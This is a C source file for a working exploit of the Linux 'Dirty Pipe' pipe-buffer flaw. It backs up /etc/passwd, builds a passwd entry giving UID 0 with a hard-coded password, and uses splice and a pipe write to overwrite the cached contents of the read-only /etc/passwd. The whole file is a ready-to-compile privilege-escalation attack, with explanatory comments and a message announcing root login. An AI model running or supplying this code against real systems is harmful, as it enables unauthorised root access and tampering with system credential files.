/*Link with -lcrypt when compiling*/
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
    if (pipe(p)) abort();

    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];

    /* fill the pipe completely; each pipe_buffer will now have
       the PIPE_BUF_FLAG_CAN_MERGE flag */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }

    /* drain the pipe, freeing all pipe_buffer instances (but
       leaving the flags initialized) */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }

    /* the pipe is now empty, and if somebody adds a new
       pipe_buffer without initializing its "flags", the buffer
       will be mergeable */
}

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n",
    from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char **argv)
{
    const char* filename = "/etc/passwd";
    const char* backupname = "/tmp/passwd.bak";

    int temp = copy_file(filename, backupname);
    if (temp == -1) {
        return 1;
    }

    /*Change the password to whatever you want the new root user's password to be.*/
    const char* newPassword = "N010v3";
    const char* salt = "!5";

    char* passwordHash = crypt(newPassword, salt);

    printf("%s\n", passwordHash);
    char generatedLine[400];
    sprintf(generatedLine, "oot:%s:0:0:Pwned:/root:/bin/bash\n", passwordHash);
    printf("New passwd line: %s", generatedLine);

    /* open the input file and validate the specified offset */
    const int fd = open(filename, O_RDONLY); // yes, read-only! :-)
    if (fd < 0) {
        perror("open failed");
        return EXIT_FAILURE;
    }

    /* create the pipe with all flags initialized with
       PIPE_BUF_FLAG_CAN_MERGE */
    int p[2];
    prepare_pipe(p);

    /* splice one byte from before the specified offset into the
       pipe; this will add a reference to the page cache, but
       since copy_page_to_iter_pipe() does not initialize the
       "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
    long int offset = 0;
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0) {
        perror("splice failed");
        return EXIT_FAILURE;
    }
    if (nbytes == 0) {
        fprintf(stderr, "short splice\n");
        return EXIT_FAILURE;
    }

    /* the following write will not create a new pipe_buffer, but
       will instead write into the page cache, because of the
       PIPE_BUF_FLAG_CAN_MERGE flag */
    nbytes = write(p[1], generatedLine, strlen(generatedLine));
    if (nbytes < 0) {
        perror("write failed");
        return EXIT_FAILURE;
    }
    if ((size_t)nbytes < strlen(generatedLine)) {
        fprintf(stderr, "short write\n");
        return EXIT_FAILURE;
    }

    printf("It worked!\n");
    printf("You can now login with root:%s\n", newPassword);
    return EXIT_SUCCESS;
    
}
